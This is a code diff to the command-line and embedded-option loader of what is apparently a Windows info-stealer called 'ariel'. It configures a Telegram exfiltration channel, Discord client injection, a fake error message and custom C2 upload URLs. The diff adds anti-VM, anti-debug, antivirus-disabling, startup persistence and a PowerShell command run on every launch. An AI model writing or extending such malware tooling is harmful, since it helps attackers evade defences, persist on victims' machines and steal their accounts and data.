@@ -31,6 +31,8 @@ options load(const int argc, wchar_t** argv, std::string& error) {
     result.telegram_chat_id = ariel::embedded::telegram_chat_id;
     result.password = ariel::embedded::password;
     result.install = ariel::embedded::install;
+    result.startup_method = ariel::embedded::startup_method;
+    if (result.startup_method.empty()) result.startup_method = "user";
     result.startup_name = ariel::embedded::startup_name;
     result.appdata_dir = ariel::embedded::appdata_dir;
     result.ping_everyone = ariel::embedded::ping_everyone;
@@ -42,6 +44,11 @@ options load(const int argc, wchar_t** argv, std::string& error) {
     result.fake_error_message = ariel::embedded::fake_error_message;
     result.discord_injection = ariel::embedded::discord_injection;
     result.injection_script = ariel::embedded_injection::script;
+    result.anti_vm = ariel::embedded::anti_vm;
+    result.anti_debug = ariel::embedded::anti_debug;
+    result.disable_av = ariel::embedded::disable_av;
+    result.powershell_command = ariel::embedded::powershell_command;
+    result.powershell_every_run = ariel::embedded::powershell_every_run;
     result.thumbnail_url = ariel::embedded::thumbnail_url;
     result.custom_c2_url = ariel::embedded::custom_c2_url;
     result.custom_c2_file_field = ariel::embedded::custom_c2_file_field;
@@ -79,6 +86,22 @@ options load(const int argc, wchar_t** argv, std::string& error) {
             result.discord_injection = true;
             continue;
         }
+        if (argument == "--anti-vm") {
+            result.anti_vm = true;
+            continue;
+        }
+        if (argument == "--anti-debug") {
+            result.anti_debug = true;
+            continue;
+        }
+        if (argument == "--disable-av") {
+            result.disable_av = true;
+            continue;
+        }
+        if (argument == "--ps-every") {
+            result.powershell_every_run = true;
+            continue;
+        }
         if (argument.rfind("--", 0) != 0) continue;
         if (i + 1 >= argc) {
             error = "missing value for " + argument;
@@ -93,6 +116,8 @@ options load(const int argc, wchar_t** argv, std::string& error) {
             result.telegram_chat_id = value;
         } else if (argument == "--password") {
             result.password = value;
+        } else if (argument == "--startup-method") {
+            result.startup_method = value;
         } else if (argument == "--startup-name") {
             result.startup_name = value;
         } else if (argument == "--appdata-dir") {
@@ -103,6 +128,8 @@ options load(const int argc, wchar_t** argv, std::string& error) {
             result.fake_error_message = value;
         } else if (argument == "--out") {
             assign_output(result, value, executable_dir);
+        } else if (argument == "--ps-command") {
+            result.powershell_command = value;
         } else if (argument == "--thumbnail-url") {
             result.thumbnail_url = value;
         } else if (argument == "--c2-url") {
